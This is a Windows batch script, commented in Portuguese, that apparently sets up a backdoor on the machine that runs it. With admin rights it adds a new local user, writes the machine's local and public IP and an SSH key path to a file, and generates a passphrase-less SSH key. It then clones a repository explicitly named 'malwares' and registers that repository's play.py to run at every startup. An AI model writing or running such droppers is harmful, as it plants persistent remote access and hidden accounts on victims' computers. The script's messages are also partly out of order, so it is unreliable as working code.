@echo off

REM Verifica se o script está sendo executado como administrador
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Este script precisa ser executado como administrador.
    pause
    exit /b 1
)

REM Instalação do Chocolatey (gerenciador de pacotes)
if not exist "%ProgramData%\chocolatey" (
    echo Instalando Chocolatey...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))"
) else (
    echo Chocolatey já está instalado.
)

REM Instalação do Git
choco install -y git

REM Instalação do Python
choco install -y python --version 3.9.7

REM Atualiza as variáveis de ambiente
refreshenv

REM Configurações
set venv_name=chrome
set venv_dir=%cd%\chrome\venv
set python_executable=python
set username=%USERNAME%
set usernameb=play
set repository_url=https://github.com/efraim-lima/malwares
set relative_path=.\modules\play.py
set install_directory=\chrome
set ssh_port=22
set ssh_dir=%USERPROFILE%\.ssh
set ssh_key=%ssh_dir%\id_rsa
set output_file=ssh_info.txt

REM Criação de um novo usuário
net user %usernameb% /add

REM Detectar o endereço IP
for /f "tokens=2 delims=:" %%f in ('nslookup %computername% ^| findstr /c:"Address"') do (
    set "ip=%%f"
)
set "ip=%ip:~1%"

REM Obter o IP público usando o serviço ipify
powershell -command "(Invoke-WebRequest -Uri 'https://api.ipify.org?format=json').Content | ConvertFrom-Json | Select-Object -ExpandProperty ip" > ip.txt
set /p public_ip=<ip.txt
del ip.txt

REM Define as permissões corretas para a chave
icacls %ssh_dir% /grant %username%:(OI)(CI)F >nul
icacls %ssh_key% /grant %username%:(OI)(CI)F >nul

REM Exporta informações para o arquivo de saída
set output_path=%USERPROFILE%\%output_file%
echo Chave SSH: %ssh_key% > %output_path%
echo Nome de usuário: %usernameb% >> %output_path%
echo IP da máquina: %ip% >> %output_path%
echo IP público: %public_ip%
echo IP público: %public_ip% >> %output_path%

echo Chave SSH criada com sucesso. As informações foram exportadas para o arquivo %output_file%.
echo Agora você pode acessar sua máquina remotamente via terminal usando:
echo ssh -p %ssh_port% %usernameb%@%ip%

REM Criação da chave SSH
mkdir %ssh_dir%
ssh-keygen -t rsa -b 4096 -f %ssh_key% -N ""

REM Clone o repositório com permissões do usuário atual
if not exist %install_directory% (
    git clone "%repository_url%" "%install_directory%"
) else (
    echo O diretório de instalação %install_directory% já existe.
)

REM Criação do ambiente virtual
if not exist %venv_dir% (
    %python_executable% -m venv "%venv_dir%"
) else (
    echo O diretório de ambiente virtual %venv_dir% já existe.
)

REM Instalação das dependências do requirements.txt (opcional)
if exist "%install_directory%\requirements.txt" (
    call "%venv_dir%\Scripts\activate.bat" && pip install -r "%install_directory%\requirements.txt"
) else (
    echo O arquivo requirements.txt não foi encontrado.
)

REM Adiciona o script play.py para ser executado na inicialização do sistema
set startup_dir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
set startup_script="%startup_dir%\play_startup.bat"

REM Cria o arquivo de inicialização
echo @echo off > %startup_script%
echo start "" python "%~dp0%relative_path%" >> %startup_script%

REM Define as permissões corretas para o arquivo de inicialização
icacls %startup_script% /grant %username%:(OI)(CI)F >nul

echo O script play.py foi configurado para ser executado na inicialização do sistema.
echo Reinicie o sistema para iniciar a execução automática.

pause